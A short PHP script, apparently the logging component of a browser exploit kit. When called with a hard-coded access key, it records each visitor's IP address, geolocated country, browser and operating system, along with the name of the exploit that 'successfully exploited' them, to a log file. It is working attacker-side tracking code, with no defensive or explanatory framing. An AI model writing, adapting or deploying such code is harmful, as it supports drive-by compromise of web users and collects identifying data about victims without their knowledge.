<?php
date_default_timezone_set("Canada/Pacific");

$connectKey = "js6283h7";

$date = date("Y/m/d H:i:s");


$countrycode = strtolower(explode(",", file_get_contents("http://freegeoip.net/csv/" . $_SERVER['REMOTE_ADDR']))[1]);


if (isset($_GET['connect']) && isset($_GET['browsertype']) && $_GET['connect'] == $connectKey && isset($_GET['exploit'])) {

    $logfile = "./logs/main.txt";
    $exploit = htmlspecialchars($_GET['exploit'], ENT_QUOTES);
    $browserType = htmlspecialchars($_GET['browsertype'], ENT_QUOTES); //XSS security
    $OSName = htmlspecialchars($_GET['osname'], ENT_QUOTES); //XSS security
    $fp = fopen($logfile, "a") or die("Unable to open file!");
     fwrite($fp, "[" . $date . "] [<img src='/flags/" .$countrycode . ".gif' />] [" . $browserType . "] [" . $OSName . "] " . htmlspecialchars($_SERVER['REMOTE_ADDR'], ENT_QUOTES) . " successfully exploited using '".$exploit."'\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
}
?>
